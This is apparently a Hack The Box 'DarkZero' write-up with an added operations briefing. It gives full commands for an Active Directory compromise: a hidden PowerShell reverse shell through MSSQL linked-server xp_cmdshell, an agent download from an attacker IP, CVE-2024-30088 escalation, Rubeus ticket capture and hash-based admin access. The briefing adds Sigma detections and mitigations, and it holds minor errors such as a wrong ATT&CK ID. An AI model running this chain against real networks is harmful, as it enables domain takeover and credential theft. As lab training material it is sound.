# DarkZero

```
Difficulty: Hard
Operating System: Windows
Hints: True
```



## TL;DR

Using the credentials **john.w:RFulUtONCOL!**, I performed service enumeration and discovered **DC01** is multihomed (10.10.11.89 and 172.16.20.1). I abused MSSQL linked servers to enable `xp_cmdshell` on the linked host, used Metasploit's `web_delivery` to gain a meterpreter shell on the internal interface, escalated to SYSTEM via a local exploit (CVE-2024-30088), ran **Rubeus** to capture Kerberos ticket material by triggering an SMB call via `xp_dirtree`, converted the captured ticket into a usable cache, and used `impacket-secretsdump` and `evil-winrm` to gain Administrator access and retrieve the root flag.



| Step |             User / Access            | Technique Used                                  | Result                                                                                                                        |
| :--: | :-: | :- | :- |
|   1  |                 `N/A`                | **Port & AD Service Enumeration**               | nmap revealed AD services + MSSQL on 10.10.11.89; DNS returned 10.10.11.89 and 172.16.20.1 (multihomed / split-horizon).      |
|   2  |               `john.w`               | **SMB / LDAP Auth & Host Mapping**              | Valid creds used to enumerate SMB; generated hosts file and confirmed limited shares.                                         |
|   3  |               `john.w`               | **MSSQL Auth & Linked Server Discovery**        | Connected to MSSQL; enumerated linked servers and discovered `DC02.darkzero.ext` mapped to higher-privileged login.           |
|   4  | `john.w` → `dc01_sql_svc` (via link) | **Enable `xp_cmdshell` on Linked Server**       | Switched context to linked server and enabled `xp_cmdshell`.                                                                  |
|   5  |        `darkzero-ext\svc_sql`        | **Remote Command Execution (web_delivery)**     | Executed Metasploit web_delivery base64 payload via `xp_cmdshell` → meterpreter shell on internal 172.16.20.2.                |
|   6  |        `darkzero-ext\svc_sql`        | **Pivot / Internal Recon**                      | Confirmed internal interface and enumerated local services for LPE.                                                           |
|   7  |         `svc_sql` → `SYSTEM`         | **Local Privilege Escalation (CVE-2024-30088)** | Used local exploit to obtain `NT AUTHORITY\SYSTEM`.                                                                           |
|   8  |           `SYSTEM` on DC02           | **Rubeus Monitor**                              | Uploaded / ran Rubeus to capture Kerberos TGT/TGS (base64 `.kirbi`) when server triggered SMB access.                         |
|   9  |              `Attacker`              | **Trigger Kerberos/NTLM via xp_dirtree**        | From MSSQL executed `xp_dirtree \\DC02\...` which caused DC01 to request ticket / fall back to NTLM — Rubeus captured output. |
|  10  |              `Attacker`              | **Ticket conversion & use**                     | Converted captured `.kirbi` → ccache; set `KRB5CCNAME` and validated with `klist`.                                            |
|  11  |            `Administrator`           | **Secrets extraction & final access**           | Used `impacket-secretsdump -k` and `evil-winrm` (or psexec with recovered hash) to get Administrator and read root flag.      |


![DarkZero](Pictures/htb_DarkZero_Mind_Map.png)




## Recon & host discovery

I started with a full TCP nmap scan of the domain controller:

```bash
nmap -p 1-65535 -T4 -A -v 10.10.11.89
```

**Nmap highlights:**

* 53/tcp open domain (Simple DNS Plus)
* 88/tcp open kerberos-sec (Microsoft Windows Kerberos)
* 135/tcp open msrpc
* 139/tcp open netbios-ssn
* 389/tcp open ldap (Active Directory)
* 445/tcp open microsoft-ds
* 636/tcp open ssl/ldap
* 1433/tcp open ms-sql-s (Microsoft SQL Server 16.00.1000.00)
* 3268/tcp, 3269/tcp open (LDAP / LDAPS global catalog)
* multiple high msrpc ports open

> The host is multihomed: DNS for `darkzero.htb` returned both `10.10.11.89` and `172.16.20.1` (split-horizon / internal network). Services bound to the `172.16.x` interface are internal-only and relevant for pivoting.

![DarkZero](Pictures/htb_darkzero_hosts.jpg)

Generate hosts file and enumerate SMB:

```bash
nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --generate-hosts-file /etc/hosts
smbmap -H 10.10.11.89 -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'
```

![DarkZero](Pictures/htb_darkzero_enum_shares.jpg)

(SMB/BloodHound enumeration produced only default shares.)

Query DNS (discover split-horizon / multihomed host):

```bash
dig @DC01.darkzero.htb ANY darkzero.htb
```

![DarkZero](Pictures/htb_darkzero_dig.jpg)

The authoritative DNS response returned two A records for `darkzero.htb`: `10.10.11.89` and `172.16.20.1`. This indicates a split-horizon DNS or multihomed host. In this box, `10.10.11.89` answered while `172.16.20.1` appears internal-only. This distinction matters for pivoting and service reachability.



## Prepare Meterpreter payload (Metasploit `web_delivery`)

Create and run a web_delivery meterpreter job from msfconsole:

```bash
msfconsole -q -x "use exploit/multi/script/web_delivery ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST tun0 ; set LPORT 443 ; set target 2 ; exploit -j"
```

This generates a Base64 web-delivery payload to execute via `xp_cmdshell` on the SQL host later.



## Connect to MSSQL and inspect linked servers

Connect to MSSQL using Impacket’s mssql client (Windows auth):

```bash
mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth
```

![DarkZero](Pictures/htb_darkzero_mssqlguest.jpg)

Attempt to enable `xp_cmdshell` on DC01 (failed initially):

```sql
enable_xp_cmdshell -- failed
```

Enumerate linked servers:

```sql
enum_links
-- shows DC02.darkzero.ext as a linked server
```

![DarkZero](Pictures/htb_darkzero_enuml.jpg)

The linked server configuration shows `DC02.darkzero.ext` as a linked server. The link uses the local account `darkzero\john.w`, which maps to the remote login `dc01_sql_svc` on DC02. This allowed us to run commands on DC02 in a higher-privilege context.

Switch to the linked server and enable `xp_cmdshell` in that context:

```sql
use_link "DC02.darkzero.ext"
enable_xp_cmdshell
-- (Success when run via linked context)
```

![DarkZero](Pictures/htb_darkzero_sql_svc.jpg)

Now run the web-delivery payload via `xp_cmdshell`:

![DarkZero](Pictures/htb_darkzero_msfserver_exc.jpg)

```sql
xp_cmdshell "powershell.exe -nop -w hidden -e XXXXXXXXXXXXXXXXXXXX"
```

![DarkZero](Pictures/htb_darkzero_powershell.jpg)

This provided a meterpreter shell as `darkzero-ext\svc_sql`. Inside the meterpreter session, `ifconfig` revealed an internal IP `172.16.20.2` (internal interface), confirming pivoting into the internal network.



## Local privilege escalation — enumerate & exploit (Metasploit)

Run the local exploit suggester from within Metasploit:

```text
use multi/recon/local_exploit_suggester
set session 1
run
```

![DarkZero](Pictures/htb_darkzero_session.jpg)
![DarkZero](Pictures/htb_darkzero_sessions_for_xp.jpg)
![DarkZero](Pictures/htb_darkzero_ifconfig.jpg)


From the suggested list we used the CVE-2024-30088 local exploit.

```text
use exploit/windows/local/cve_2024_30088_authz_basep
set payload windows/x64/meterpreter_reverse_tcp
set session 1
set lhost tun0
set AutoCheck false
run
```

![DarkZero](Pictures/htb_darkzero_msf_exploit.jpg)


After running the exploit and checking `getuid`, we obtained `NT AUTHORITY\SYSTEM` — full administrative access on the host.

**Alternative (non-Metasploit):** Upload a small agent via `xp_cmdshell` and use `lligolo`/route + `impacket psexec.py` with an NTLM hash to pivot and execute commands on DC02.

Example upload and psexec usage:

```sql
xp_cmdshell "powershell wget -UseBasicParsing http://10.10.xx.xx/agent.exe -OutFile %temp%/agent.exe"
```

Then on attacker:

```bash
psexec.py Administrator@172.16.20.2 -hashes :XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

And read user flag:

```text
DC02 : 172.16.20.2
type C:\Users\Administrator\Desktop\user.txt
```

![DarkZero](Pictures/htb_darkzero_User_Flag.jpg)

## Rubeus: capture Kerberos ticket material

Other privilege escalation checks (e.g. WinPEAS) returned nothing useful, so we used **Rubeus** to monitor Kerberos activity on the target. Rubeus can detect newly issued or used TGT/TGS tickets and output them in base64 `.kirbi` format.

From SYSTEM / meterpreter on DC02:

```text
cd %temp%
# upload Rubeus.exe via Meterpreter
upload Rubeus.exe
```

Switch to an interactive shell and run Rubeus monitor:

```cmd
shell
C:\Windows\Temp\Rubeus.exe monitor /interval:1 /nowrap
```

Trigger the ticket retrieval from the SQL server by causing it to access an SMB resource on DC02 using `xp_dirtree` from the MSSQL client on DC01:

```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
-- then on the DB connection:
xp_dirtree \\\\DC02.darkzero.ext\\XXXXXXXXXX
```

Rubeus on DC02 captured the base64 ticket output. Save that output to `ticket.bs4.kirbi`.



## Convert captured ticket to usable Kerberos cache

On your attacker host, decode the base64 ticket and convert it to a ccache:

```bash
cat ticket.bs4.kirbi | base64 -d > ticket.kirbi
python3 ticketConverter.py ticket.kirbi dc01_admin.ccache
export KRB5CCNAME=dc01_admin.ccache
klist
```

Verify the TGT/TGS is present with `klist`.



## Use Kerberos ticket with impacket/secretsdump and evil-winrm

With the converted ticket, run `impacket-secretsdump` to extract secrets or hashes:

```bash
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
```

If NTLM hashes are recovered, authenticate as `Administrator` via `evil-winrm`:

```bash
evil-winrm -i 10.10.11.89 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

![DarkZero](Pictures/htb_darkzero_Admin.jpg)

Finally read the root flag:

```text
type C:\Users\Administrator\Desktop\root.txt
```

![DarkZero](Pictures/htb_darkzero_Root_Flag.jpg)


# Short Notes

# DarkZero.htb: TACTICAL OPERATIONS BRIEFING

 

## PHASE 1: STRATEGIC OVERVIEW

* **1.1 Definition:**  
  A multihomed domain controller (DC01) exposed to the Internet and an internal subnet (`172.16.20.x`). The target is a Windows Server with SQL Server, Kerberos, LDAP, and SMB services. Attack surface includes split‑horizon DNS, linked servers, and privileged SQL accounts.

* **1.2 Impact:**  
  Full domain takeover – elevation to `NT AUTHORITY\SYSTEM` on DC01 → access to all internal resources, persistence, and data exfiltration. Ultimately leads to the root flag (Administrator).

* **1.3 The Scenario:**  
  1. External enumeration reveals open ports and services.  
  2. A web‑delivery payload is injected via `xp_cmdshell` on a linked SQL Server.  
  3. Meterpreter pivots into internal network (`172.16.20.2`).  
  4. Local privilege escalation (CVE‑2024‑30088) grants SYSTEM.  
  5. Kerberos tickets captured with Rubeus, converted to ccache, and used for lateral movement / secrets dumping.  
  6. Administrator access yields the root flag.

 

## PHASE 2: SYSTEM ARCHITECTURE & THEORY

* **2.1 Protocol Environment:**  
  - **Domain Controllers:** DC01 (public), DC02 (internal).  
  - **Services:** DNS, Kerberos, LDAP/LDAPS, SMB (NetBIOS, RPC), MSSQL Server, MS‑SQL SMO.  
  - **Network Segments:** `10.10.11.x` (Internet) and `172.16.20.x` (internal).  

* **2.2 Attack Logic Flow:**  
> External Access → Web‑Delivery Payload → `xp_cmdshell` on linked SQL Server → Meterpreter → Internal Pivot (`172.16.20.2`) → Local Exploit (CVE‑2024‑30088) → SYSTEM → Rubeus Monitor → Kerberos Ticket Capture → ccache Conversion → Secretsdump / Evil‑WinRM → Administrator → Root Flag.

* **2.3 Theoretical Analogy:**  
  The environment behaves like a *split‑horizon bridge*: external traffic enters via the public side, but internal services are reachable only through an internal gateway. Attackers must first build a bridge (web‑delivery) to step onto the internal side and then climb higher (local exploit).

 

## PHASE 3: THE ATTACK VECTOR (MECHANICS)

### THE CORE MECHANISM

| Attribute | Technical Details |
|   |   |
| **Primary Identifiers** | `DC01.darkzero.ext` linked server, `darkzero\john.w` SQL login, `dc01_sql_svc` remote service account |
| **Critical Vulnerability** | Linked server trust allowing elevated context; lack of `xp_cmdshell` restrictions; CVE‑2024‑30088 local privilege escalation |
| **Offensive Action** | 1. Inject Base64 web‑delivery payload via `xp_cmdshell`. <br>2. Pivot to internal IP (`172.16.20.2`). <br>3. Exploit CVE‑2024‑30088 → SYSTEM. <br>4. Run Rubeus monitor; trigger ticket issuance with `xp_dirtree`. <br>5. Convert ticket, use for secretsdump/evil‑winrm. |

### PREREQUISITES

* **Access Level:** Initial Windows authentication (`john.w` / `RFulUtONCOL!`).  
* **Connectivity:** TCP ports 135, 139, 445 (SMB), 1433 (MSSQL). Internal interface must be reachable (`172.16.20.2`).  
* **Target State:** Linked server configured to use local account mapping; SQL Server allows `xp_cmdshell` once elevated via linked context.

 

## PHASE 4: THREAT HUNTING & ANOMALY ANALYSIS

* **Hunt Hypothesis:**  
  *Technique:* Kerberos Ticket Dumping (T1487).  
  *Artifacts:* New TGT/TGS entries for `cifs/DC02` or NTLM challenge responses on SMB logs.  
  *Data Sources:* Windows Security Event ID 4624/4625, Sysmon EID 3, SMB audit logs.

* **Behavioral Outliers:**  
  A seemingly benign SQL query (`xp_dirtree`) triggers a Kerberos TGS request to an internal server – anomalous because the attacker is not expected to initiate such traffic from a database context.  

* **Toxic Combinations:**  
  - `darkzero\john.w` (SQL login) → `dc01_sql_svc` on DC02 (linked server).  
  - `DC01$` service account used by SQL Server, potentially exposed via Kerberos ticket.  
  These identities can be pivoted to compromise other domain services if not properly isolated.

 

## PHASE 5: DETECTION ENGINEERING (BLUE TEAM)

* **Telemetry Gap Analysis:**  

| Offensive Action | Windows Event ID | Sysmon EID | EDR Telemetry Point |
|   |   |   |   |
| `xp_cmdshell` execution | 4688 (process creation) | 1 (process start) | Process Creation – `powershell.exe -e <payload>` |
| Linked server context switch | 4624 (logon success) | N/A | Logon Session – SQL Service Account |
| CVE‑2024‑30088 exploit | 4688 (meterpreter spawn) | 3 (file creation) | Process Creation – `C:\Windows\Temp\exploit.exe` |
| Rubeus monitor | 4688 | 1 | Process Creation – `Rubeus.exe monitor` |
| Kerberos ticket issuance | 4769 (Kerberos Ticket Granting) | N/A | Kerberos TGS request to `cifs/DC02` |

* **Detection-as-Code (Sigma)**

```yaml
title: Rubeus Kerberos Ticket Capture
id: d4b2f8a1-3e5d-4d7c-9b6f-1c9b0b4e8a12
description: Detects Rubeus monitoring of Kerberos tickets in a domain.
status: experimental
author: Senior Cyber‑Operations Architect
date: 2025-12-19

logsource:
  product: windows
  service: sysmon

detection:
  selection:
    EventID: 1
    Image: '*\\Rubeus.exe'
  condition: selection

falsepositives:
  - Legitimate use of Rubeus for troubleshooting

level: high
```

* **Resilience Test:**  
  *Bypass:* Adversary could rename `Rubeus.exe` to avoid the filename filter.  
  *Sub‑Rule Countermeasure:* Add a hash‑based detection and monitor for any process that opens Kerberos APIs (`KDC_REQ_TGS`) while on a non‑trusted domain controller.

nano 

## PHASE 6: TOOLKIT & IMPLEMENTATION

* **Automation:**  
  - `nmap` (full TCP scan).  
  - `smbmap`, `impacket-mssqlclient`.  
  - `msfconsole` (web_delivery, local exploit CVE‑2024‑30088).  
  - `Rubeus.exe monitor`.  
  - `ticketConverter.py`, `impacket-secretsdump`, `evil-winrm`.

* **OPSEC Analysis:**  
  *Footprint:* Base64 payload, SQL queries (`xp_cmdshell`, `xp_dirtree`).  
  *Covert Methods:* Use of internal IP for pivoting; silent PowerShell execution (`-w hidden`); leveraging existing linked server trust.

* **Post‑Exploitation:**  
  - Persist via scheduled task or service.  
  - Enumerate domain users, group memberships.  
  - Dump credential material with `secretsdump`.  
  - Extract flags and exfiltrate data.

 

## PHASE 7: DEFENSIVE MITIGATION

* **Technical Hardening:**  
  1. Disable `xp_cmdshell` unless absolutely required; enforce least‑privilege SQL service accounts.  
  2. Remove or restrict linked servers that grant cross‑server impersonation.  
  3. Harden Kerberos: correct SPNs, enforce time synchronization, monitor ticket requests.  
  4. Enable SMB auditing on internal shares; block unauthorized TGS requests.

* **Personnel Focus:**  
  - Review SQL Server permissions and service account scopes.  
  - Conduct regular penetration tests for linked server trust relationships.  
  - Train administrators on the risks of split‑horizon DNS configurations.

 

## QUICK-ACTION PLAYBOOK

| Step | Objective | Technical Command / Logic |
|   |   |   |
| **01** | Enumerate SMB shares on internal host | `smbmap -H 172.16.20.2 -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'` |
| **02** | Inject web‑delivery payload via SQL | `xp_cmdshell "powershell.exe -nop -w hidden -e <base64>"` |
| **03** | Capture Kerberos ticket with Rubeus | `Rubeus.exe monitor /interval:1 /nowrap` and trigger `xp_dirtree \\DC02.darkzero.ext\share` |
| **04** | Convert ticket to ccache | `cat ticket.bs4.kirbi | base64 -d > ticket.kirbi && python3 ticketConverter.py ticket.kirbi admin.ccache` |
| **05** | Dump secrets with impacket | `impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'` |
| **06** | Access Administrator shell | `evil-winrm -i 10.10.11.89 -u administrator -H <NTLM hash>` |
| **07** | Retrieve root flag | `type C:\Users\Administrator\Desktop\root.txt` |

 